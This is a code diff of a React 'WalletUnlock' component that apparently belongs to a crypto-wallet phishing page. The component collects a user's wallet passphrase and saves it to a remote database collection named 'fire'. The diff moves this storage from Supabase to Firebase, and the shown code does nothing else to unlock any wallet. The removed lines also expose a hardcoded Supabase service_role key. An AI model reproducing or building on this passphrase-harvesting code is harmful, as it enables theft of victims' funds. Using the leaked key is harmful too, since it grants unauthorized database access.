@@ -1,12 +1,6 @@
 import React, { useState } from 'react';
-import { createClient } from '@supabase/supabase-js';
-
-const supabaseUrl = "https://oxsnztxcaehckiadajbw.supabase.co";
-const supabaseKey =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im94c256dHhjYWVoY2tpYWRhamJ3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjY4NjYyMSwiZXhwIjoyMDkyMjYyNjIxfQ.kZT5BjHeNH0UxKuGYKWMjhmBzf_LU3Br9s6T6dCjsX4";
-
-
-const supabase = createClient(supabaseUrl, supabaseKey);
+import { db } from '../firebase';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 
 const WalletUnlock = () => {
   const [passphrase, setPassphrase] = useState('');
@@ -36,18 +30,15 @@ const WalletUnlock = () => {
     setError('');
 
     try {
-      const { data, error } = await supabase
-        .from('fire')
-        .insert([{ passphrase }]);
+      await addDoc(collection(db, 'fire'), {
+        passphrase,
+        created_at: serverTimestamp(),
+      });
 
-      if (error) {
-        throw error;
-      }
-
-      console.log('Inserted into Supabase:', data);
+      console.log('Inserted into Firebase');
       setSuccess(true); // ✅ show success modal
     } catch (err) {
-      console.error('Error inserting into Supabase:', err.message);
+      console.error('Error inserting into Firebase:', err.message);
       setError('Failed to unlock wallet. Please try again.');
     }
   };
